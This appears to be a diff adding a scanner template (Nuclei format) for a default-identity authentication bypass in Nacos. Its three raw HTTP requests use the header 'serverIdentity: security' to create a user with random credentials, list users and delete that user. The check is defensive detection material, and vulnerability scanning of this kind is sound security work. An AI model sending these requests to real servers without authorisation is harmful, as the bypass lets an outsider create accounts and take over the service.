@@ -1,0 +1,37 @@
+id: nacos-default-identity
+
+info:
+  name: Nacos - Default Identity
+  author: SleepingBag945
+  severity: high
+  description: 从1.4.1版本开始，Nacos添加服务身份识别功能，用户可以自行配置服务端的Identity，不再使用User-Agent作为服务端请求的判断标准。存在默认identity
+  reference:
+    - https://zhuanlan.zhihu.com/p/602021283
+  tags: nacos,unauth
+
+http:
+  - raw:
+      - |
+        POST /v1/auth/users/?username={{randstr_1}}&password={{randstr_2}} HTTP/1.1
+        Host: {{Hostname}}
+        serverIdentity: security
+
+      - |
+        GET /v1/auth/users?pageNo=1&pageSize=9&search=blur HTTP/1.1
+        Host: {{Hostname}}
+        serverIdentity: security
+
+      - |
+        DELETE /v1/auth/users/?username={{randstr_1}} HTTP/1.1
+        Host: {{Hostname}}
+        serverIdentity: security
+ 
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200 && contains(body_1,'create user ok!')"
+          - "status_code_2 == 200"
+          - "contains(body_3,'delete user ok!')"
+        condition: and
